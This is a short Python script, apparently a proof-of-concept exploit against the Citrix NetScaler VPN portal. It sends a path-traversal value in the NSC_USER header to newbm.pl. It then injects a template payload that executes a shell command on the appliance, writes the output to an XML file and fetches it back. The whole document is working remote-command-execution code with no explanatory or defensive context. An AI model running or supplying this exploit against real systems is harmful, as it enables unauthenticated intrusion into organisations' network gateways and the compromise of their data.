import string
import random
import requests

domain= 'https://example.com'
command='id'
filename=''.join(random.choice(string.ascii_lowercase + string.ascii_uppercase) for _ in range(10))

headers={
"Content-type": "application/x-www-form-urlencoded",
"NSC_NONCE": "oways",
"NSC_USER": "/../../../../../../../../../../netscaler/portal/templates/{}".format(filename)
}
data="url=http://example.com&title=[%25+template.new(%7b'BLOCK'%3d'exec(\\'{} | tee /netscaler/portal/templates/{}.xml\\')%3b'%7d)+%25]&desc=test&UI_inuse=RfWeb".format(command,filename)
requests.post("{}/vpn/../vpns/portal/scripts/newbm.pl".format(domain),data=data,headers=headers)

headers={
"NSC_USER": "oways",
"NSC_NONCE": "oways"}

r=requests.get("{}/vpn/../vpns/portal/{}.xml".format(domain,filename),headers=headers)
print("Command: {}\nOutput:\n{}\n".format(command,r.content))